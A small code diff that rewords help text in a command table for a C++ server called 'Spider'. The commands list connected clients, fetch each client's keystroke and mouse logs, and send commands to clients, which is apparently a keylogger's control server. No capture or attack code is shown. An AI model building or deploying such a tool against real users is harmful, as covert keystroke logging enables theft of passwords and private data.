@@ -29,8 +29,8 @@ namespace Spider {
 
     const std::vector<std::tuple<std::string, std::string, std::string>> _serverCommands = {
       std::make_tuple("list-clients", "", "Get a list of all clients connected to the server."),
-      std::make_tuple("get-keylog", "<clientUUID> [limit]", "Get log for a client. Default limit = 1000 entries"),
-      std::make_tuple("get-mouselog", "<clientUUID> [limit]", "Get log for a client. Default limit = 1000 entries"),
+      std::make_tuple("get-keylog", "<clientUUID> [limit]", "Get key log for a client. Default limit = 1000 entries"),
+      std::make_tuple("get-mouselog", "<clientUUID> [limit]", "Get mouse log for a client. Default limit = 1000 entries"),
       std::make_tuple("send", "<clientUUID> <method> [argument]", "Send a command to a client. Type \"commands\" for more precisions.")
     };
 
